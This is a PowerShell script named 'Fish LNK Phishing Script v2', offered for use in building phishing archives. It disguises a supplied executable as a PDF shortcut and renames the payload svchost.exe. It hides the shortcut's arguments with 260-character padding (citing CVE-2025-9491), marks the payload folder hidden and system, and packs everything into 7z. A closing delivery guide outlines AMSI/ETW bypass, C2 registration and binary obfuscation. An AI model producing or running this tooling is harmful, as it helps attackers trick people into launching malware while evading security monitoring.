# Fish LNK Phishing Script v2 (Evasion Hardened)
# Improvements:
#   1. CVE-2025-9491: LNK args hidden after 260-char padding
#   2. No cmd.exe/bat middle layer: LNK -> payload directly
#   3. Harmless dir name (.assets, NOT __MACOSX which is known IOC)
#   4. Payload renamed to svchost.exe
# Usage: .\phish.ps1 -ExePath .\fish.exe -DecoyName "report.pdf" -IconType "pdf"

param(
    [Parameter(Mandatory=$true)]
    [string]$ExePath,
    [string]$DecoyName = "report.pdf",
    [string]$DecoyContent = "",
    [string]$IconType = "pdf",
    [string]$OutputName = "report",
    [string]$ResDir = ".assets",
    [switch]$KeepWorking = $false
)

$ErrorActionPreference = "Stop"

if (-not (Test-Path $ExePath)) {
    Write-Host "[!] Payload not found: $ExePath" -ForegroundColor Red
    exit 1
}

$workDir = Join-Path $env:TEMP "fish_lnk_$(Get-Random)"

Write-Host "[+] Fish LNK Phishing Tool v2 (Evasion Hardened)" -ForegroundColor Cyan
Write-Host "[+] Work dir: $workDir"

# Step 1: Create dirs + copy files
Write-Host "[+] Creating directory structure..."

$resPath = Join-Path $workDir $ResDir
New-Item -ItemType Directory -Path $resPath -Force | Out-Null

$payloadName = "svchost.exe"
Copy-Item $ExePath (Join-Path $resPath $payloadName)

$decoyPath = Join-Path $resPath $DecoyName
if ($DecoyContent -ne "") {
    Set-Content -Path $decoyPath -Value $DecoyContent -Encoding UTF8
} else {
    $defaultDecoy = "Fish C2 Decoy Document - Replace with real PDF"
    Set-Content -Path $decoyPath -Value $defaultDecoy -Encoding UTF8
}

Write-Host "[+] Directory structure:" -ForegroundColor Green
Write-Host "  $OutputName.lnk  (icon: $IconType)"
Write-Host "  $ResDir\"
Write-Host "    |-- $DecoyName (decoy)"
Write-Host "    |-- $payloadName (payload)"

# Step 2: Generate LNK (CVE-2025-9491 hardened)
Write-Host "[+] Generating LNK shortcut (CVE-2025-9491 arg hiding)..."

$lnkPath = Join-Path $workDir "$OutputName.lnk"

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($lnkPath)

# Key: LNK targets payload directly (no cmd.exe/bat layer)
# Payload has built-in: AMSI bypass -> ETW bypass -> drop PDF -> C2 register
$shortcut.TargetPath = Join-Path $ResDir $payloadName

# CVE-2025-9491: 260-char whitespace padding hides args from Properties dialog
$padding = " " * 260
$shortcut.Arguments = $padding

$shortcut.WindowStyle = 7  # SW_SHOWMINNOACTIVE

# Icon map (harmless system icons)
$iconMap = @{
    "pdf"    = "$env:SystemRoot\System32\shell32.dll,68"
    "txt"    = "$env:SystemRoot\System32\shell32.dll,70"
    "doc"    = "$env:SystemRoot\System32\shell32.dll,42"
    "xls"    = "$env:SystemRoot\System32\shell32.dll,120"
    "folder" = "$env:SystemRoot\System32\shell32.dll,3"
}

if ($iconMap.ContainsKey($IconType)) {
    $shortcut.IconLocation = $iconMap[$IconType]
} else {
    $shortcut.IconLocation = $iconMap["pdf"]
}

$shortcut.Description = $DecoyName
$shortcut.Save()

Write-Host "[+] LNK generated: $lnkPath" -ForegroundColor Green
Write-Host "    Target: $ResDir\$payloadName (direct, no cmd.exe layer)"
Write-Host "    Args: 260-char padding (CVE-2025-9491)"
Write-Host "    Icon: $IconType"

# Step 3: Set hidden attributes
Write-Host "[+] Setting hidden attributes..."

$resItem = Get-Item $resPath -Force
$resItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::Directory

Get-ChildItem $resPath -Recurse -Force | ForEach-Object {
    $_.Attributes = $_.Attributes -bor [System.IO.FileAttributes]::Hidden
}

Write-Host "[+] Hidden attributes set" -ForegroundColor Green

# Step 4: 7-Zip packaging
Write-Host "[+] Packaging..."

$output7z = Join-Path (Get-Location) "$OutputName.7z"
$outputZip = Join-Path (Get-Location) "$OutputName.zip"

$sevenZip = $null
$sevenZipPaths = @(
    "C:\Program Files\7-Zip\7z.exe",
    "C:\Program Files (x86)\7-Zip\7z.exe",
    (Get-Command 7z -ErrorAction SilentlyContinue).Source
)

foreach ($p in $sevenZipPaths) {
    if ($p -and (Test-Path $p)) { $sevenZip = $p; break }
}

if ($sevenZip) {
    Push-Location $workDir
    & $sevenZip a -r $output7z "." | Out-Null
    Pop-Location
    Write-Host "[+] 7z archive: $output7z" -ForegroundColor Green
} else {
    Compress-Archive -Path "$workDir\*" -DestinationPath $outputZip -Force
    Write-Host "[+] ZIP archive: $outputZip (warning: may lose hidden attrs)" -ForegroundColor Yellow
}

# Step 5: Cleanup
if (-not $KeepWorking) {
    Get-ChildItem $resPath -Recurse -Force | ForEach-Object {
        $_.Attributes = [System.IO.FileAttributes]::Normal
    }
    $resItem.Attributes = [System.IO.FileAttributes]::Normal
    Remove-Item $workDir -Recurse -Force
    Write-Host "[+] Work dir cleaned" -ForegroundColor Green
} else {
    Write-Host "[*] Work dir kept: $workDir" -ForegroundColor Yellow
}

# Delivery guide
Write-Host ""
Write-Host "========== Delivery Guide ==========" -ForegroundColor Cyan
Write-Host ""
Write-Host "Chain: LNK -> payload.exe (AMSI/ETW bypass -> drop PDF -> C2)"
Write-Host ""
Write-Host "Evasion:"
Write-Host "  - No cmd.exe/bat middle layer"
Write-Host "  - CVE-2025-9491 arg hiding (260-char padding)"
Write-Host "  - Payload renamed svchost.exe"
Write-Host "  - Dir name .assets (NOT __MACOSX)"
Write-Host "  - AMSI + ETW bypass built into payload"
Write-Host ""
Write-Host "Notes:"
Write-Host "  - Payload must have //go:embed decoy.pdf"
Write-Host "  - Build with: garble -tiny -literals -controlflow"
Write-Host "  - 7z preserves hidden attrs, ZIP may not"
Write-Host "======================================" -ForegroundColor Cyan
